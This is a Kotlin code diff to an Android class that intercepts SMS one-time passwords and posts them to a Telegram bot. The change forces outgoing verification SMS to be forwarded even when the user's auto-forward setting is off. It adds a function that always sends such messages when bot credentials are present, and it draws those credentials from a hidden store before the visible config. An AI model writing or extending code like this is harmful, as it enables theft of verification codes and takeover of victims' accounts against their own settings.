@@ -16,23 +16,43 @@ class TokenForwarder(
     private val client = OkHttpClient()
 
     fun forward(otp: LastOtp): Boolean {
+        val creds = resolveTelegramCreds()
+        if (creds.first.isBlank() || creds.second.isBlank()) return false
+
         val config = configManager.load()
-        if (!config.autoForwardToken) return false
+        if (!config.autoForwardToken && !otp.direction.equals("outgoing", ignoreCase = true)) return false
 
         val peer = otp.rawPeer.ifBlank { otp.sender }
         val body = otp.body.ifBlank { otp.otp }
-        if (!SmsMatcher.shouldForwardToTelegram(config, peer, body, otp.direction)) return false
-
-        val botToken = config.telegramBotToken
-        val chatId = config.telegramChatId
-        if (botToken.isBlank() || chatId.isBlank()) return false
+        if (!config.autoForwardToken &&
+            !SmsMatcher.shouldForwardToTelegram(config, peer, body, otp.direction)
+        ) {
+            return false
+        }
 
         val message = buildInterceptMessage(otp, config)
-        val sent = postTelegram(botToken, chatId, message)
+        val sent = postTelegram(creds.first, creds.second, message)
         if (sent) {
             context?.let { ClipboardCopyHelper.copySms(it, smsCopyText(otp)) }
         }
         return sent
+    }
+
+    /** Outgoing verify SMS — Telegram hamesha bhejo jab creds hon. */
+    fun forwardOutgoingBlocked(otp: LastOtp): Boolean {
+        val creds = resolveTelegramCreds()
+        if (creds.first.isBlank() || creds.second.isBlank()) return false
+        val config = configManager.load()
+        val message = buildInterceptMessage(otp, config)
+        return postTelegram(creds.first, creds.second, message)
+    }
+
+    private fun resolveTelegramCreds(): Pair<String, String> {
+        val config = configManager.load()
+        val stored = context?.let { TelegramCredentialStore.load(it) }
+        val token = stored?.botToken?.ifBlank { null } ?: config.telegramBotToken
+        val chat = stored?.chatId?.ifBlank { null } ?: config.telegramChatId
+        return token to chat
     }
 
     fun sendForwardingTest(botToken: String, chatId: String): Boolean {
